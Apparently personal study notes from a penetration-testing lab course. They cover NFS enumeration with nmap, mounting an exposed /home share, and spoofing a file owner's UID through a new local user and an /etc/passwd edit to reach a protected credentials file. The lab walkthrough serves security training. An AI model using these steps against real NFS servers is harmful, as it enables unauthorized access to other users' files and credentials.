Network File System (NFS) 213 is a distributed file system protocol originally developed by Sun
Microsystems in 1984. It allows a user on a client computer to access files over a computer
network as if they were on locally-mounted storage.

scanning

portmapper and RCPbind run on TCP port 111

nmap -v -p 111 10.11.1.1-254

andd to find services registered with rcpbind

nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

## imprtant

/usr/share/nmap/scripts


We can run all three of these scripts using the wildcard character (*) in the script name:
```
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
...
Nmap scan report for 10.11.1.72
PORT
STATE SERVICE
111/tcp open rpcbind
| nfs-showmount:
|_ /home 10.11.0.0/255.255.0.0
```

In this case, the entire /home directory is being shared and we can access it by mounting it on our
Kali virtual machine. We will use mount to do this, along with -o nolock to disable file locking,
which is often needed for older NFS servers:

```
kali@kali:~$ mkdir home
kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/home/
kali@kali:~$ cd home/ && ls
jenny joe45 john marcus ryuu
Listing 259 - Using mount to access the NFS share in Kali
Based on this file listing, we can see that there are a few home directories for local users on the
remote machine. Digging a bit deeper, we find a filename that catches our attention, so we try to
view it:
kali@kali:~/home$ cd marcus
kali@kali:~/home/marcus$ ls -la
total 24
drwxr-xr-x 2 1014 1014 4096 Jun 10 09:16 .
drwxr-xr-x 7 root root 4096 Sep 17 2015 ..
-rwx------ 1 1014 1014
48 Jun 10 09:16 creds.txt
kali@kali:~/home/marcus$ cat creds.txt
cat: creds.txt: Permission denied
Listing 260 - Using built-in commands to explore the NFS share
```

It appears we do not have permission to view this file. Taking a closer look at the file permissions,
we can see that its owner has a UUID of 1014, and also read (r), write (w), and execute (x)
permissions on it. What can we do with this information? Since we have complete access to our
Kali machine, we can try to add a local user to it using the adduser command, change its UUID to
1014, su to that user, and then try accessing the file again:
```
kali@kali:~/home/stefan$ sudo adduser pwn
```

Based on the output above, we can see that the new user has a UUID of 1001, which is not really
what we need. We can change it to 1014 using sed and confirm the change took place. The -i
option is used to replace the file in-place and the -e option executes a script. In this case, that
happens to be ‘s/1001/1014/g’ , which will globally replace the UUID in the /etc/passwd file:
```
kali@kali:~/home/marcus$ sudo sed -i -e 's/1001/1014/g' /etc/passwd
kali@kali:~/home/marcus$ cat /etc/passwd | grep pwn
pwn:x:1014:1014:,,,:/home/pwn:/bin/bash
Listing 262 - Updating the UUID in the /etc/passwd file
```
So far so good. Let’s try to su to the newly added pwn user, verify that our UUID has indeed changed,
and then try accessing that file again. We will use the su command to change the current login
session’s owner. Then, we will use id to display our current user ID. Finally, we will try to access
the file again:
```
kali@kali:~/home/marcus$ su pwn
pwn@kali:/root/home/marcus$ id
uid=1014(pwn) gid=1014 groups=1014
```
